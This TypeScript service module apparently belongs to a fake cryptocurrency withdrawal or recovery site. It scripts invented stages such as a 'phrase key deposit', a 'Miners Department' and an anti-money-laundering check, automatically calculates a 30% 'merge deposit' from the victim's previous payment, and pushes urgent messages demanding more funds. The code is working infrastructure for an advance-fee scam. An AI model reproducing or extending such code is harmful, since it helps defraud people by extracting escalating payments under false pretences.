import { caseRepository, messageRepository } from "../repositories";
import type { Case, InsertCase, UpdateCase, CaseLetter, UpdateCaseLetter } from "@shared/schema";

const STAGE_MESSAGES: Record<string, { category: 'urgent' | 'processing' | 'resolved'; title: string; body: string }> = {
  '1': {
    category: 'processing',
    title: 'Phrase Key Deposit Received',
    body: 'Your phrase key deposit has been successfully received and confirmed on the blockchain ledger. Your account is now queued for phrase key generation. Please allow 24-48 hours for the secure encryption process to complete.'
  },
  '3': {
    category: 'resolved',
    title: 'Phrase Key Certificate Approved',
    body: 'Your Phrase Key has been successfully verified and approved. Your unique encryption certificate has been generated and is now active for withdrawal processing.'
  },
  '4': {
    category: 'processing',
    title: 'Withdrawal Process Initiated',
    body: 'Your withdrawal request has been officially initiated. Our compliance team is now processing your request through our secure verification protocols.'
  },
  '7': {
    category: 'urgent',
    title: 'Phrase Key Merge Deposit Required',
    body: 'A 30% merge deposit is required to complete the phrase key verification process. Please deposit the required amount to proceed with your withdrawal.'
  },
  '8': {
    category: 'processing',
    title: 'Financial Department Verification',
    body: 'Your withdrawal request has advanced to the Financial Department for compliance verification.'
  },
  '10': {
    category: 'urgent',
    title: 'Blockchain Activity Verification Required',
    body: 'Blockchain activity verification is now required. Please ensure your receiving wallet maintains the required USDT balance for verification purposes.'
  },
  '11': {
    category: 'processing',
    title: 'Miners Department Processing',
    body: 'Your withdrawal is now being processed by the Miners Department for blockchain transaction preparation and optimization.'
  },
  '12': {
    category: 'processing',
    title: 'Money Laundry Funds Check',
    body: 'Your withdrawal is undergoing mandatory anti-money laundering verification as required by international financial regulations.'
  },
  '13': {
    category: 'processing',
    title: 'Final Withdrawal Processing',
    body: 'Your withdrawal has entered the final processing stage. All verifications have been completed and funds are being prepared for release.'
  },
  '14': {
    category: 'resolved',
    title: 'Withdrawal Now Released',
    body: 'Congratulations! Your withdrawal has been successfully released and is now being transferred to your designated wallet address.'
  }
};

export class CaseService {
  async createCase(data: InsertCase): Promise<Case> {
    return caseRepository.create(data);
  }

  async getCaseById(id: string): Promise<Case | undefined> {
    return caseRepository.findById(id);
  }

  async getCaseByAccessCode(code: string): Promise<Case | undefined> {
    return caseRepository.findByAccessCode(code);
  }

  async getAllCases(): Promise<Case[]> {
    return caseRepository.findAll();
  }

  async updateCase(id: string, data: UpdateCase): Promise<Case | undefined> {
    if (data.phraseKeyDepositAmount) {
      const numericMatch = data.phraseKeyDepositAmount.match(/[\d,.]+/);
      const currencyMatch = data.phraseKeyDepositAmount.match(/[A-Za-z]+$/);
      const currencySuffix = currencyMatch ? ' ' + currencyMatch[0] : '';
      
      if (numericMatch) {
        const depositAmount = parseFloat(numericMatch[0].replace(/,/g, ''));
        if (!isNaN(depositAmount)) {
          const mergeDeposit = depositAmount * 0.30;
          data.phraseKeyMergeDeposit = mergeDeposit.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + currencySuffix;
        }
      }
    }

    const currentCase = await caseRepository.findById(id);
    const previousStage = currentCase?.withdrawalStage;
    const newStage = data.withdrawalStage;

    if (newStage === '3' && !currentCase?.phraseKeyCertificateSent) {
      data.phraseKeyCertificateSent = true;
    }
    
    const updated = await caseRepository.update(id, data);
    if (!updated) return undefined;

    if (newStage && previousStage !== newStage && STAGE_MESSAGES[newStage]) {
      if (newStage === '3' && currentCase?.phraseKeyCertificateSent) {
      } else {
        const msg = STAGE_MESSAGES[newStage];
        await messageRepository.createAdminMessage({
          caseId: id,
          category: msg.category,
          title: msg.title,
          body: msg.body,
          isRead: false
        });
      }
    }

    return updated;
  }

  async deleteCase(id: string): Promise<void> {
    return caseRepository.delete(id);
  }

  async getCaseLetter(caseId: string): Promise<CaseLetter | undefined> {
    return caseRepository.getLetter(caseId);
  }

  async updateCaseLetter(caseId: string, data: UpdateCaseLetter): Promise<CaseLetter> {
    return caseRepository.createOrUpdateLetter(caseId, data);
  }
}

export const caseService = new CaseService();
